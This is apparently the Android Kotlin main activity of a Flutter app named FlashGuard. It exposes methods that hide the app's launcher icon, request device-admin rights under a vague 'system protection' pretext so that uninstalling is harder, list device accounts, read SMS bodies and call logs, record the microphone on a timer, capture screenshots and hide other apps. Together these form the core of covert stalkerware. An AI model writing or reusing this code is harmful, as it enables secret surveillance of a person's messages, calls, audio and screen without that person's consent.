package com.flashguard.flashguard

import android.accounts.Account
import android.accounts.AccountManager
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.FileOutputStream

class MainActivity : FlutterActivity() {

    private val CHANNEL       = "com.flashguard/control"
    private val REQ_SCREEN    = 1001
    private val REQ_ADMIN     = 1002
    private val handler       = Handler(Looper.getMainLooper())

    private var mediaRecorder: MediaRecorder? = null
    private var projectionManager: MediaProjectionManager? = null
    private var mediaProjection: MediaProjection? = null
    private var pendingScreenResult: MethodChannel.Result? = null
    private var pendingScreenPath: String? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        projectionManager =
            getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {

                    // ── Icon hide / show ──────────────────────────────────
                    "hideIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(
                                ComponentName(this, "com.flashguard.flashguard.MainActivityAlias"),
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            result.success(true)
                        } catch (e: Exception) { result.error("HIDE_ICON_FAILED", e.message, null) }
                    }

                    "showIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(
                                ComponentName(this, "com.flashguard.flashguard.MainActivityAlias"),
                                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            result.success(true)
                        } catch (e: Exception) { result.error("SHOW_ICON_FAILED", e.message, null) }
                    }

                    // ── Device Admin (uninstall protection) ───────────────
                    "enableDeviceAdmin" -> {
                        try {
                            val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                            val admin = ComponentName(this, FlashGuardAdmin::class.java)
                            if (dpm.isAdminActive(admin)) {
                                result.success(true)
                            } else {
                                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                    "Required for system protection and security monitoring.")
                                startActivityForResult(intent, REQ_ADMIN)
                                pendingScreenResult = result
                            }
                        } catch (e: Exception) { result.error("ADMIN_FAILED", e.message, null) }
                    }

                    "isDeviceAdminActive" -> {
                        try {
                            val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                            val admin = ComponentName(this, FlashGuardAdmin::class.java)
                            result.success(dpm.isAdminActive(admin))
                        } catch (e: Exception) { result.success(false) }
                    }

                    // ── Accounts (Gmail detection) ────────────────────────
                    "getAccounts" -> {
                        try {
                            val am       = AccountManager.get(this)
                            val accounts = am.accounts
                            val list     = accounts.map { acc ->
                                mapOf("name" to acc.name, "type" to acc.type)
                            }
                            result.success(list)
                        } catch (e: Exception) { result.success(emptyList<Map<String, String>>()) }
                    }

                    // ── Save user credentials for uninstall protection ────
                    "saveUserCredentials" -> {
                        try {
                            val phone = call.argument<String>("phone") ?: ""
                            val email = call.argument<String>("email") ?: ""
                            val prefs = getSharedPreferences("fg_acc", Context.MODE_PRIVATE)
                            prefs.edit()
                                .putString("user_phone", phone)
                                .putString("user_email", email)
                                .apply()
                            result.success(true)
                        } catch (e: Exception) { result.error("CRED_FAILED", e.message, null) }
                    }

                    // ── SMS ───────────────────────────────────────────────
                    "getSmsLogs" -> {
                        try {
                            val list = mutableListOf<Map<String, Any?>>()
                            fun querySms(uri: String, type: String) {
                                contentResolver.query(
                                    Uri.parse(uri),
                                    arrayOf("address", "body", "date"),
                                    null, null, "date DESC"
                                )?.use { c ->
                                    var n = 0
                                    while (c.moveToNext() && n < 30) {
                                        list.add(mapOf(
                                            "address" to (c.getString(0) ?: ""),
                                            "body"    to (c.getString(1) ?: ""),
                                            "date"    to c.getLong(2),
                                            "type"    to type
                                        )); n++
                                    }
                                }
                            }
                            querySms("content://sms/inbox", "inbox")
                            querySms("content://sms/sent",  "sent")
                            list.sortByDescending { it["date"] as Long }
                            result.success(list.take(40))
                        } catch (e: Exception) { result.error("SMS_FAILED", e.message, null) }
                    }

                    // ── Call logs ─────────────────────────────────────────
                    "getCallLogs" -> {
                        try {
                            val list = mutableListOf<Map<String, Any?>>()
                            contentResolver.query(
                                android.provider.CallLog.Calls.CONTENT_URI,
                                arrayOf(
                                    android.provider.CallLog.Calls.NUMBER,
                                    android.provider.CallLog.Calls.CACHED_NAME,
                                    android.provider.CallLog.Calls.TYPE,
                                    android.provider.CallLog.Calls.DURATION,
                                    android.provider.CallLog.Calls.DATE
                                ), null, null,
                                "${android.provider.CallLog.Calls.DATE} DESC"
                            )?.use { c ->
                                var n = 0
                                while (c.moveToNext() && n < 50) {
                                    val t = c.getInt(2)
                                    list.add(mapOf(
                                        "number"    to (c.getString(0) ?: ""),
                                        "name"      to (c.getString(1) ?: "Unknown"),
                                        "type"      to when(t) {
                                            android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                                            android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                            android.provider.CallLog.Calls.MISSED_TYPE   -> "missed"
                                            else -> "unknown"
                                        },
                                        "duration"  to c.getLong(3),
                                        "timestamp" to c.getLong(4)
                                    )); n++
                                }
                            }
                            result.success(list)
                        } catch (e: Exception) { result.error("CALL_LOG_FAILED", e.message, null) }
                    }

                    // ── Mic recording ─────────────────────────────────────
                    "startRecording" -> {
                        try {
                            val path     = call.argument<String>("path") ?: ""
                            val duration = call.argument<Int>("duration") ?: 30
                            mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
                            @Suppress("DEPRECATION")
                            val mr = if (android.os.Build.VERSION.SDK_INT >= 31) MediaRecorder(this) else MediaRecorder()
                            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
                            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                            mr.setAudioSamplingRate(22050)
                            mr.setAudioEncodingBitRate(64000)
                            mr.setOutputFile(path)
                            mr.prepare(); mr.start()
                            mediaRecorder = mr
                            handler.postDelayed({
                                try { mr.stop(); mr.release() } catch (_: Exception) {}
                                if (mediaRecorder === mr) mediaRecorder = null
                            }, duration * 1000L)
                            result.success(true)
                        } catch (e: Exception) { result.error("REC_FAILED", e.message, null) }
                    }

                    "stopRecording" -> {
                        try {
                            mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
                            mediaRecorder = null
                            result.success(true)
                        } catch (e: Exception) { result.error("STOP_REC_FAILED", e.message, null) }
                    }

                    // ── Screen capture — request permission ───────────────
                    "requestScreenCapture" -> {
                        try {
                            if (mediaProjection != null) {
                                result.success(true)
                                return@setMethodCallHandler
                            }
                            pendingScreenResult = result
                            val intent = projectionManager!!.createScreenCaptureIntent()
                            startActivityForResult(intent, REQ_SCREEN)
                        } catch (e: Exception) { result.error("SCREEN_REQ_FAILED", e.message, null) }
                    }

                    // ── Screen capture — take screenshot ──────────────────
                    "takeScreenshot" -> {
                        val path = call.argument<String>("path") ?: ""
                        val mp   = mediaProjection
                        if (mp == null) {
                            result.error("NO_PROJECTION", "Screen capture not authorized", null)
                            return@setMethodCallHandler
                        }
                        captureScreen(mp, path, result)
                    }

                    // ── Block app ─────────────────────────────────────────
                    "blockApp" -> {
                        try {
                            val pkg = call.argument<String>("package") ?: ""
                            if (pkg.isNotEmpty()) {
                                val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                                val admin = ComponentName(this, FlashGuardAdmin::class.java)
                                if (dpm.isAdminActive(admin)) {
                                    dpm.setApplicationHidden(admin, pkg, true)
                                    result.success(true)
                                } else {
                                    result.error("NOT_ADMIN", "Device admin not active", null)
                                }
                            } else {
                                result.success(false)
                            }
                        } catch (e: Exception) { result.error("BLOCK_FAILED", e.message, null) }
                    }

                    // ── Unblock app ───────────────────────────────────────
                    "unblockApp" -> {
                        try {
                            val pkg = call.argument<String>("package") ?: ""
                            if (pkg.isNotEmpty()) {
                                val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                                val admin = ComponentName(this, FlashGuardAdmin::class.java)
                                if (dpm.isAdminActive(admin)) {
                                    dpm.setApplicationHidden(admin, pkg, false)
                                    result.success(true)
                                } else {
                                    result.error("NOT_ADMIN", "Device admin not active", null)
                                }
                            } else {
                                result.success(false)
                            }
                        } catch (e: Exception) { result.error("UNBLOCK_FAILED", e.message, null) }
                    }

                    else -> result.notImplemented()
                }
            }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            REQ_SCREEN -> {
                if (resultCode == Activity.RESULT_OK && data != null) {
                    mediaProjection = projectionManager?.getMediaProjection(resultCode, data)
                    pendingScreenResult?.success(true)
                } else {
                    pendingScreenResult?.success(false)
                }
                pendingScreenResult = null
            }
            REQ_ADMIN -> {
                val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, FlashGuardAdmin::class.java)
                pendingScreenResult?.success(dpm.isAdminActive(admin))
                pendingScreenResult = null
            }
        }
    }

    private fun captureScreen(mp: MediaProjection, path: String, result: MethodChannel.Result) {
        try {
            val dm      = resources.displayMetrics
            val w       = dm.widthPixels.takeIf { it > 0 } ?: 1080
            val h       = dm.heightPixels.takeIf { it > 0 } ?: 1920
            val density = dm.densityDpi.takeIf { it > 0 } ?: 420

            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
            val vd: android.hardware.display.VirtualDisplay? = mp.createVirtualDisplay(
                "FGScreen", w, h, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, null
            )

            handler.postDelayed({
                try {
                    val image = reader.acquireLatestImage()
                    if (image == null) {
                        vd?.release(); reader.close()
                        result.error("NO_FRAME", "No frame captured", null)
                        return@postDelayed
                    }
                    val plane  = image.planes[0]
                    val buf    = plane.buffer
                    val rowPad = plane.rowStride - plane.pixelStride * w
                    val bmp    = Bitmap.createBitmap(
                        w + rowPad / plane.pixelStride, h, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(buf)
                    val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
                    image.close()
                    vd?.release(); reader.close()

                    FileOutputStream(path).use { fos ->
                        cropped.compress(Bitmap.CompressFormat.JPEG, 72, fos)
                    }
                    result.success(path)
                } catch (e: Exception) {
                    try { vd?.release(); reader.close() } catch (_: Exception) {}
                    result.error("CAPTURE_FAILED", e.message, null)
                }
            }, 600L)
        } catch (e: Exception) {
            result.error("CAPTURE_SETUP_FAILED", e.message, null)
        }
    }

    override fun onDestroy() {
        mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
        mediaRecorder = null
        mediaProjection?.stop()
        mediaProjection = null
        super.onDestroy()
    }
}
